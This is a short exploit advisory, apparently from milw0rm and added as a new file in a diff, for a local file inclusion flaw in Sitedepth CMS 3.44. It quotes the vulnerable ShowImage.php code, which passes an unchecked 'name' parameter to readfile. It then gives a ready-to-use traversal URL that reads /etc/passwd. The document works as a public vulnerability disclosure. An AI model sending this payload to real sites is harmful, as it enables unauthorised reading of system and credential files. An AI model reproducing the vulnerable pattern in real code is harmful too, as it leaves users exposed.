@@ -1,0 +1,38 @@
+__________________________________________________________________________
+
+[*] Sitedepth CMS 3.44 Local File Include LFI Exploit       
+__________________________________________________________________________
+
+[!] Application homepage :   http://www.sitedepth.com/
+[!] Author               :   H4 / Team XPK 
+[!] Contact              :   H4_XPK@hotmail.com
+[!] Bug discovered       :   2006-11-07
+[!] Bug published        :   2007-06-25
+
+---------------------------------------------------------------------
+
+Vuln. code: ShowImage.php
+
+
+<?php
+
+  include 'sitedepth.php';
+  $content_type = 'image/jpeg';
+  $filename = SD_DIRS_REPOS . '/html/' . $_GET['name'];
+  $filename_show = $_GET['name'];
+  header ('Content-type: ' . $content_type);
+  header ('Content-Disposition: inline;    filename=' . $filename_show);
+  readfile ($filename);   <-------------- BAD!   
+?>
+
+---------------------------------------------------------------------
+
+[!] Exploitation : http://noobie.com/sitedepth/ShowImage.php?name=../../../../../../../../etc/passwd
+
+---------------------------------------------------------------------
+
+[!] Sometimes it`s time to give instead of taking :)
+
+[!] Greetz to Angeldust & Streets and to rest of community.
+
+# milw0rm.com [2007-06-25]
